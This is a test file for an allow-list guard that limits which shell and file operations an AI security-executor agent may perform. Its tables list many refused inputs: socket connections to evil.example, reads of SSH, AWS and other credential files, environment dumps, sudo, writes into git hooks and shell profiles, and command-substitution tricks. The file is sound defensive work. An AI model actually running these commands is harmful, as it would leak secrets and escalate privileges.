// R37: the allow list guard of the Security Executor (spec 0.5.0, 5g, S5-19). Calls redteamGuard() in process.
// ARC9: each refused case asserts the exact reason text.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { redteamGuard, REASONS } from '../scripts/lib/redteam-guard.mjs';

const SX = 'guilda:security-executor';
const mk = (prefix) => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));
const dir = mk('guilda-proj-');
spawnSync('git', ['init', '-q'], { cwd: dir });
const home = mk('guilda-home-');
const state = mk('guilda-state-');
const outside = mk('guilda-outside-');
for (const d of ['src', 'tests/fixtures', 'rules', 'fake-home/.ssh', 'fake-home/.claude', 'app']) fs.mkdirSync(path.join(dir, d), { recursive: true });
fs.writeFileSync(path.join(dir, 'src', 'a.js'), 'x\n');
fs.writeFileSync(path.join(dir, 'tests', 'fixtures', '.env'), 'A=1\n');
fs.writeFileSync(path.join(dir, 'rules', 'r.yml'), 'rules: []\n');
fs.symlinkSync(outside, path.join(dir, 'link-out'));
const ENV = { ...process.env, HOME: home, XDG_STATE_HOME: state };
const KEYS = path.join('guilda', 'keys');

// The literal texts: a change of one text is a change of the contract.
const TEXT = {
  tool: 'R37: this tool is not allowed for the Security Executor.',
  command: 'R37: the command is not on the allow list of the Security Executor. Stop and report (SX1).',
  syntax: 'R37: the shell text has a form that the guard does not read (expansion, substitution, heredoc, group or background).',
  option: 'R37: an option or an argument of this command is not allowed.',
  runTarget: 'R37: this command may run only a script or a test file of the project.',
  outside: 'R37: a path is outside the project and the task worktree.',
  credential: 'R37: a credential path.',
  envFile: 'R37: a .env file outside a fixtures folder.',
  glob: 'R37: a glob word needs a fixed prefix inside the project.',
  write: 'R37: a protected folder or file (.git, .guilda, .claude, .husky, .vscode, .idea, .envrc, .npmrc, .pypirc, a shell profile).',
  failed: 'R37: the guard could not check the call (X9).',
};

const call = (tool_name, tool_input, agent_type = SX) => ({ tool_name, tool_input, agent_type, cwd: dir });
const bash = (command, agent_type) => call('Bash', { command }, agent_type);
const guard = (input) => redteamGuard(dir, input, ENV);

test('REASONS holds the contract texts', () => {
  assert.deepEqual({ ...REASONS }, TEXT);
});

// The ten planted steps of lab L5-5.
const PLANTED = [
  ['network to a public host', bash('curl --max-time 2 http://guilda-lab.invalid/'), 'command'],
  ['write to a shell profile outside', call('Write', { file_path: path.join(outside, '.bashrc'), content: 'lab' }), 'outside'],
  ['read of a fake ssh key', call('Read', { file_path: path.join(dir, 'fake-home', '.ssh', 'id_ed25519') }), 'credential'],
  ['cat of ~/.ssh', bash('cat ~/.ssh/guilda-lab-absent-key'), 'credential'],
  ['cat of .aws', bash(`cat ${dir}/fake-home/.aws/credentials ~/.aws/guilda-lab-absent`), 'credential'],
  ['cat of .claude', bash(`cat ~/.claude/guilda-lab-absent.json ${dir}/fake-home/.claude/.credentials.json`), 'credential'],
  ['printenv of a token', bash('printenv GUILDA_LAB_FAKE_TOKEN'), 'command'],
  ['npm install', bash('npm install --registry http://127.0.0.1:9/ left-pad'), 'option'],
  ['sudo', bash('sudo -n true'), 'command'],
  ['pkexec', bash('pkexec --version'), 'command'],
];
for (const [name, input, key] of PLANTED) {
  test(`S5-19 planted: ${name}`, () => {
    assert.deepEqual(guard(input), { reason: TEXT[key] });
    assert.equal(guard({ ...input, agent_type: 'guilda:executor' }), null);
  });
}

// Each bypass of the Security report, and the other refused forms: [name, command, reason key].
const REFUSED = [
  ['socat', 'socat - TCP:evil.example:80', 'command'],
  ['openssl', 'openssl s_client -connect evil.example:443', 'command'],
  ['python3 -c socket', 'python3 -c "import socket"', 'option'],
  ['heredoc to python', 'python3 <<EOF\nimport socket\nEOF', 'syntax'],
  ['heredoc to cat', 'cat <<EOF\nx\nEOF', 'syntax'],
  ['curl -x host', 'curl -x evil.example:8080 http://localhost', 'command'],
  ['curl --connect-to', 'curl --connect-to a:80:evil.example:80 http://a', 'command'],
  ['curl -o outside', `curl -o ${outside}/a http://localhost`, 'command'],
  ['git remote update', 'git remote update', 'option'],
  ['git archive --remote', 'git archive --remote=evil.example:r HEAD', 'option'],
  ['git submodule update', 'git submodule update --init', 'option'],
  ['git push', 'git push origin main', 'option'],
  ['git -C before the verb', 'git -C . log', 'option'],
  ['git log --output', 'git log --output=x', 'option'],
  ['git diff --no-index outside', 'git diff --no-index /etc/passwd src/a.js', 'outside'],
  ['quote join of a tool name', 'cu"rl" http://localhost', 'command'],
  ['quote join of git', '"gi"t push', 'option'],
  ['quote join of a path', 'cat "~"/.ssh/x', 'credential'],
  ['gh', 'gh api /user', 'command'],
  ['rm', 'rm a.txt', 'command'],
  ['env', 'env', 'command'],
  ['printenv', 'printenv', 'command'],
  ['ps eww', 'ps eww', 'command'],
  ['declare -x', 'declare -x', 'command'],
  ['export -p', 'export -p', 'command'],
  ['set', 'set', 'command'],
  ['echo is not on the list', 'echo hi', 'command'],
  ['a path as the command', './run.sh', 'command'],
  ['an assignment first', 'A=1 ls', 'command'],
  ['bash -c', 'bash -c "ls"', 'command'],
  ['xargs', 'ls | xargs cat', 'command'],
  ['sudo in a pipe', 'ls | sudo tee a', 'command'],
  ['doas', 'doas id', 'command'],
  ['pip install', 'pip install x', 'command'],
  ['npm install', 'npm install', 'option'],
  ['npm exec', 'npm exec cowsay', 'option'],
  ['npm with a flag first', 'npm --prefix /tmp test', 'option'],
  ['npx with no --no-install', 'npx cowsay hi', 'runTarget'],
  ['npx -y', 'npx --no-install -y cowsay', 'option'],
  ['node -e', 'node -e "1"', 'option'],
  ['node --eval', 'node --eval 1', 'option'],
  ['node bare', 'node', 'runTarget'],
  ['node --require', 'node -r ./x.js src/a.js', 'option'],
  ['python3 -m http.server', 'python3 -m http.server', 'runTarget'],
  ['python3 bare', 'python3', 'runTarget'],
  ['pytest -p', 'pytest -p evil', 'option'],
  ['$VAR', 'cat $HOME/.aws/credentials', 'syntax'],
  ['command substitution', 'cat $(ls)', 'syntax'],
  ['backtick', 'cat `ls`', 'syntax'],
  ['double quoted $', 'cat "$X"', 'syntax'],
  ['background', 'cat a &', 'syntax'],
  ['subshell', '(ls)', 'syntax'],
  ['brace', 'ls {a,b}', 'syntax'],
  ['process substitution', 'cat <(ls)', 'syntax'],
  ['unterminated quote', "cat 'a", 'syntax'],
  ['redirect with no target', 'cat a >', 'syntax'],
  ['read of ~', 'ls ~', 'outside'],
  ['grep -r ~', 'grep -r x ~', 'outside'],
  ['cp -r ~', 'cp -r ~ x', 'outside'],
  ['find ~', 'find ~ -name x', 'outside'],
  ['find /', 'find / -name x', 'outside'],
  ['find -exec', 'find . -exec ls x \\;', 'option'],
  ['find -delete', 'find . -delete', 'option'],
  ['~user', 'ls ~root', 'outside'],
  ['~user path', 'cat ~root/.ssh/x', 'outside'],
  ['proc environ with ..', 'cat /proc/self/../self/environ', 'outside'],
  ['/etc', 'cat /etc/passwd', 'outside'],
  ['.. out', 'cat ../x', 'outside'],
  ['through a link', 'cat link-out/a.txt', 'outside'],
  ['link then ..', 'cat link-out/../x', 'outside'],
  ['key folder', `cat ${state}/${KEYS}/abc.key`, 'credential'],
  ['~/.ssh', 'cat ~/.ssh/id_ed25519', 'credential'],
  ['~/.aws', 'cat ~/.aws/credentials', 'credential'],
  ['gcloud', 'cat ~/.config/gcloud/x', 'credential'],
  ['~/.claude', 'cat ~/.claude/x', 'credential'],
  ['~/.codex', 'cat ~/.codex/auth.json', 'credential'],
  ['a fake .ssh in the project', 'cat fake-home/.ssh/id', 'credential'],
  ['.env', 'cat .env', 'envFile'],
  ['.env.local', 'cat app/.env.local', 'envFile'],
  ['< .env', 'cat < .env', 'envFile'],
  ['glob in a credential folder', 'cat ~/.s*h/id_rsa', 'outside'],
  ['glob outside', 'cat /etc/pass*', 'outside'],
  ['glob with ..', 'cat ../*', 'glob'],
  ['glob that can match .env', 'ls .e*', 'envFile'],
  ['glob .*', 'ls .*', 'envFile'],
  ['glob **/.env', 'cat **/.env', 'envFile'],
  ['redirect outside', `cat src/a.js > ${outside}/a`, 'outside'],
  ['append outside', `cat src/a.js >> ${outside}/a`, 'outside'],
  ['>| outside', `cat src/a.js >| ${outside}/a`, 'outside'],
  ['2> outside', `cat src/a.js 2> ${outside}/a`, 'outside'],
  ['&> outside', `cat src/a.js &> ${outside}/a`, 'outside'],
  ['< outside', 'cat < /etc/passwd', 'outside'],
  ['redirect to .guilda', 'cat src/a.js > .guilda/x', 'write'],
  ['redirect to a profile', 'cat src/a.js > .bashrc', 'write'],
  ['cp outside', `cp src/a.js ${outside}/a`, 'outside'],
  ['mv up', 'mv src/a.js ../a', 'outside'],
  ['cp --target-directory=', `cp --target-directory=${outside} src/a.js`, 'outside'],
  ['cp -t', 'cp -t src src/a.js', 'option'],
  ['cp to ~user', 'cp src/a.js ~root/a', 'outside'],
  ['cp into .guilda', 'cp src/a.js .guilda/a', 'write'],
  ['touch outside', `touch ${outside}/a`, 'outside'],
  ['mkdir in .guilda', 'mkdir .guilda/x', 'write'],
  ['sed -i outside', `sed -i s/a/b/ ${outside}/a`, 'outside'],
  ['sed -i in .guilda', 'sed -i s/a/b/ .guilda/a', 'write'],
  ['sed e flag', 'sed s/a/b/e src/a.js', 'option'],
  ['sed w command', 'sed "w out" src/a.js', 'option'],
  ['awk system', "awk 'BEGIN{system(\"x\")}' src/a.js", 'option'],
  ['awk ENVIRON', "awk 'BEGIN{print ENVIRON[\"A\"]}'", 'option'],
  ['jq env', 'jq -n env', 'option'],
  ['rg --pre', 'rg --pre ./x a', 'option'],
  ['semgrep with no config', 'semgrep --metrics=off src', 'option'],
  ['semgrep with no --metrics=off', 'semgrep --config rules/r.yml src', 'option'],
  ['semgrep with --metrics=on', 'semgrep --metrics=on --config rules/r.yml src', 'option'],
  ['tar -x', 'tar -xf a.tar', 'command'],
  ['unzip', 'unzip a.zip', 'command'],
  ['read of .guilda', 'cat .guilda/bus/user.jsonl', 'write'],
  ['ls of .guilda', 'ls .guilda', 'write'],
  ['grep in .guilda', 'grep -r x .guilda/queue', 'write'],
  ['uniq a .guilda/x', 'uniq a .guilda/x', 'write'],
  ['sort -o .guilda/x', 'sort -o .guilda/x a', 'write'],
  ['sort -o.guilda/x', 'sort -o.guilda/x a', 'write'],
  ['sort --output=.guilda/x', 'sort --output=.guilda/x a', 'write'],
  ['eslint -o .guilda/x', 'eslint -o .guilda/x src', 'write'],
  ['eslint --output-file=.guilda/x', 'eslint --output-file=.guilda/x src', 'write'],
  ['a glob that can match .guilda', 'cat .gu*', 'write'],
  ['a glob that can match .git', 'ls .g*', 'write'],
  ['a glob inside .guilda', 'cat .guilda/*', 'write'],
  ['write into .git', 'cp src/a.js .git/hooks/pre-commit', 'write'],
  ['write into .git by mv', 'mv src/a.js .git/config', 'write'],
  ['write into .git by a redirect', 'cat src/a.js > .git/hooks/post-commit', 'write'],
  ['touch the .git file', 'touch .git', 'write'],
  ['write into .claude', 'cp src/a.js .claude/settings.json', 'write'],
  ['mkdir .claude', 'mkdir .claude/x', 'write'],
  ['write into .husky', 'cp src/a.js .husky/pre-commit', 'write'],
  ['write into .vscode', 'touch .vscode/tasks.json', 'write'],
  ['write into .idea', 'touch .idea/x', 'write'],
  ['write .envrc', 'cat src/a.js > .envrc', 'envFile'],
  ['write .npmrc', 'cat src/a.js > .npmrc', 'credential'],
  ['write .pypirc', 'cat src/a.js > .pypirc', 'write'],
  ['write a nested .npmrc', 'cp src/a.js app/.npmrc', 'credential'],
  ['sed -i in .husky', 'sed -i s/a/b/ .husky/x', 'write'],
  ['semgrep registry', 'semgrep --config auto src', 'option'],
  ['semgrep registry path', 'semgrep --config p/ci src', 'option'],
  ['semgrep login', 'semgrep login', 'option'],
  ['gitleaks with no --no-banner', 'gitleaks detect', 'option'],
  ['gitleaks protect', 'gitleaks protect --no-banner', 'option'],
  ['osv-scanner online', 'osv-scanner .', 'option'],
  ['osv-scanner fix', 'osv-scanner fix --offline', 'option'],
  ['trufflehog', 'trufflehog filesystem .', 'command'],
  ['crontab', 'crontab -l', 'command'],
  ['systemctl', 'systemctl --user enable x', 'command'],
];
for (const [name, command, key] of REFUSED) {
  test(`refused: ${name}`, () => {
    assert.deepEqual(guard(bash(command)), { reason: TEXT[key] }, command);
  });
}

test('allowed local commands pass', () => {
  const allowed = [
    'ls', 'ls -la src', 'ls *.js', 'cat src/a.js', 'cat src/a.js | head -5 | wc -l', 'head -n 5 src/a.js',
    'tail -n 3 src/a.js', 'grep -rn "eval(" src/', 'grep -rn password .', "grep -n 'a|b' src/a.js", 'rg -n token src',
    'find . -name "*.js" -not -path ./node_modules/x', 'diff src/a.js rules/r.yml', 'jq .a package.json',
    "sed -n '1,5p' src/a.js", 'sed s/a/b/ src/a.js', 'sed -i s/a/b/ src/a.js', "awk '{print $1}' src/a.js",
    'sort src/a.js | uniq', 'ls && git status', 'ls; git diff', 'git status', 'git diff HEAD~1 -- src/a.js',
    'git log --oneline -5', 'git show HEAD', 'git blame src/a.js', 'git ls-files', 'git rev-parse --show-toplevel',
    'node --test tests/', 'node src/a.js', 'python3 tests/t.py', 'python3 -m pytest tests', 'pytest -q tests',
    'npm test', 'npm run lint', 'npx --no-install eslint .', 'semgrep --config rules/r.yml --metrics=off src',
    'semgrep --config=rules --metrics=off src', 'semgrep --metrics off --config rules/r.yml src', 'gitleaks detect --no-banner --source .', 'bandit -r src', 'gosec ./...',
    'eslint src', 'osv-scanner --offline .', 'mkdir -p tests/sec', 'touch tests/sec/a.txt',
    'cp src/a.js tests/sec/a.js', 'mv tests/sec/a.js tests/sec/b.js', 'cat src/a.js > out.txt',
    'cat src/a.js >> out.txt', 'cat src/a.js 2>&1', 'cat src/a.js > /dev/null 2>&1', 'cat < src/a.js',
    'cat tests/fixtures/.env', 'ls tests/fixtures/', "cat 'src/a.js'", 'cat "src/a.js"', 'cat src/a.js # note',
  ];
  for (const command of allowed) assert.equal(guard(bash(command)), null, command);
});

test('Read, Grep, Glob, Write and Edit take a path inside the project only', () => {
  const R = (tool, input) => guard(call(tool, input));
  assert.equal(R('Read', { file_path: path.join(dir, 'src', 'a.js') }), null);
  assert.equal(R('Read', { file_path: path.join(dir, 'tests', 'fixtures', '.env') }), null);
  assert.equal(R('Grep', { pattern: 'password', path: dir }), null);
  assert.equal(R('Glob', { pattern: 'src/**/*.js' }), null);
  assert.equal(R('Write', { file_path: path.join(dir, 'tests', 'sec.test.js'), content: 'x' }), null);
  assert.equal(R('Edit', { file_path: path.join(dir, 'src', 'a.js'), old_string: 'a', new_string: 'b' }), null);
  const refuse = (tool, input, key) => assert.deepEqual(R(tool, input), { reason: TEXT[key] }, `${tool} ${JSON.stringify(input)}`);
  refuse('Read', { file_path: path.join(dir, '.env') }, 'envFile');
  refuse('Read', { file_path: '/etc/hosts' }, 'outside');
  refuse('Read', { file_path: '~/.aws/credentials' }, 'credential');
  refuse('Read', { file_path: path.join(state, KEYS, 'k.key') }, 'credential');
  refuse('Glob', { pattern: '**/.env' }, 'envFile');
  refuse('Glob', { pattern: '/etc/*' }, 'outside');
  refuse('Grep', { pattern: 'x', path: path.join(home, '.ssh') }, 'credential');
  refuse('Grep', { pattern: 'x', path: outside }, 'outside');
  refuse('Write', { file_path: path.join(outside, 'a.txt'), content: 'x' }, 'outside');
  refuse('Write', { file_path: path.join(dir, 'link-out', 'a.txt'), content: 'x' }, 'outside');
  refuse('Write', { file_path: path.join(dir, '..', 'a.txt'), content: 'x' }, 'outside');
  refuse('Edit', { file_path: '/etc/hosts', old_string: 'a', new_string: 'b' }, 'outside');
  refuse('Write', { file_path: path.join(dir, '.guilda', 'security', 'approvals.jsonl'), content: '' }, 'write');
  refuse('Write', { file_path: path.join(dir, '.bashrc'), content: '' }, 'write');
  refuse('Write', {}, 'failed');
  refuse('WebFetch', { url: 'http://localhost' }, 'tool');
  refuse('Skill', { skill: 'x' }, 'tool');
  refuse('Read', { file_path: path.join(dir, '.guilda', 'bus', 'user.jsonl') }, 'write');
  refuse('Grep', { pattern: 'x', path: path.join(dir, '.guilda') }, 'write');
  refuse('Write', { file_path: path.join(dir, '.git', 'hooks', 'pre-commit'), content: '' }, 'write');
  refuse('Write', { file_path: path.join(dir, '.claude', 'settings.json'), content: '' }, 'write');
  refuse('Edit', { file_path: path.join(dir, '.husky', 'pre-commit'), old_string: 'a', new_string: 'b' }, 'write');
  refuse('Write', { file_path: path.join(dir, '.envrc'), content: '' }, 'envFile');
  refuse('WebSearch', { query: 'x' }, 'tool');
  refuse('mcp__x__y', {}, 'tool');
  refuse('Agent', {}, 'tool');
  refuse('Bash', {}, 'failed');
});

test('a cwd outside the project is refused, and no root is an error (X9)', () => {
  assert.deepEqual(guard({ ...bash('ls'), cwd: outside }), { reason: TEXT.outside });
  const r = redteamGuard('/nonexistent/guilda/project', { ...bash('ls'), cwd: '/nonexistent/guilda/cwd' }, ENV);
  assert.deepEqual(r, { reason: TEXT.failed });
});

test('agent_type is matched in lower case with the spaces cut; other types are untouched', () => {
  for (const type of [' Guilda:Security-Executor ', 'GUILDA:SECURITY-EXECUTOR']) {
    assert.deepEqual(guard({ ...bash('sudo id'), agent_type: type }), { reason: TEXT.command }, type);
  }
  for (const type of ['guilda:executor', 'guilda:reviewer', 'guilda:security', undefined, '', 'guilda:security-executor-x', 5]) {
    assert.equal(guard({ ...bash('sudo id'), agent_type: type }), null, String(type));
    assert.equal(guard({ ...call('WebFetch', {}), agent_type: type }), null, String(type));
  }
  assert.equal(redteamGuard(dir, null, ENV), null);
  assert.equal(redteamGuard(dir, 'x', ENV), null);
});

test('a reason holds no command text', () => {
  const r = guard(bash('curl https://very-secret-host.example/path?token=abc'));
  assert.deepEqual(r, { reason: TEXT.command });
  assert.doesNotMatch(r.reason, /very-secret-host|token=abc|curl/);
});
